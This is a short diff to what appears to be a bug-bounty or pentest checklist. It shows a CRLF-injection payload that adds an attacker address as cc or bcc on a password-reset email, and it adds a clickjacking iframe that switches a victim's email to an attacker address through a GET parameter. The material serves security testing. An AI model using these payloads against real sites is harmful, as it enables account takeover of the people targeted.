@@ -42,3 +42,10 @@ Origin
 - Click Forgot Password
 - Enter victim@mail.com%0d%0accattacker@mail.com Or victim@mail.com%0d%0abccattacker@mail.com
 ```
+
+### Email Change
+#### ClickJacking
+```
+If email can change via GET parameter then check is there any protection against ClickJacking.
+<iframe src="http://example.com/change?email=attacker@mail.com"></iframe>
+```
